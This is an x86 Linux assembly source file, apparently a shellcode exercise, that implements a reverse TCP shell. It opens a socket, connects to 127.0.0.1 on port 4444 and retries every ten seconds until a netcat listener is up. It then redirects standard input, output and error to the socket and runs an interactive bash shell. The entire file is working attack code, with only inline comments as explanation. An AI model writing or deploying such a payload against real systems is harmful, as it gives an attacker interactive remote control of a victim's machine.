; last update by KD and SD the 15/01/22

global _start


section .text


section .data
ncmsg db "You need to launch nc -nlvp 4444", 0xA
len equ $ - ncmsg

arg0 db "/bin////bash", 0
arg1 db "-i", 0
argv dd arg0, arg1, 0
envp dd 0

timeval:
tv_sec dd 0 ; seconds
tv_nsec dd 0 ; nanoseconds


_start:

xor eax, eax
mov al, 0x66 ; socketcall syscall

xor ebx, ebx
mov bl, 0x1  ; socket syscall

xor ecx, ecx
push ecx ; protocol : tcp
push 0x1 ; socket type : SOCKET_STREAM
push 0x2 ; domain : AF_INET

mov  ecx, esp
int 0x80 ; launch the syscall

xor edx, edx

mov edx, eax ; mov socketfd from socket syscall return value in edx
mov al, 0x66 ; socketcall syscall
mov bl, 0x3  ; connect syscall

; sockaddr structure
xor ecx, ecx
push 0x0100007F ; address : 127.0.0.1
push word 0x5C11 ; port : 4444
push word 0x2 ; type : AF_INET

mov esi, esp ; save address of the sockaddr

push 0x10 ; addrlen
push esi  ; address of sockaddr
push edx  ; socketfd

mov ecx, esp ; ecx point to the top of the stack
int 0x80

; if the return code of eax is not null, nc is not lauch, so we need to wait and go back to the begining of the code

cmp eax, 0
je dupfd

mov edx, len
mov ecx, ncmsg
mov ebx, 1 ; stdout
mov eax, 4 ; syscall write
int 0x80

xor ecx, ecx
mov dword [tv_sec], 0xA ; time in seconds : 10
mov dword [tv_nsec], 0 ; time in nanoseconds : 0
mov eax, 0xA2 ; nano_sleep call
mov ebx, timeval ; mov structure in ebx
int 0x80

jmp _start

dupfd:
mov al, 0x3F ; mov dup2 syscall to al for STDIN
mov ebx, edx ; mov socketfd in ebx
xor ecx, ecx
int 0x80

mov al,0x3F ; mov dup2 syscall to al for STDOUT
mov cl, 0x1
int 0x80

mov al, 0x3F ; mov dup2 syscall to al for STDERR
mov cl, 0x2
int 0x80

mov al, 0xB ; execve syscall
mov ebx, arg0
mov ecx, argv
mov edx, envp
int 0x80
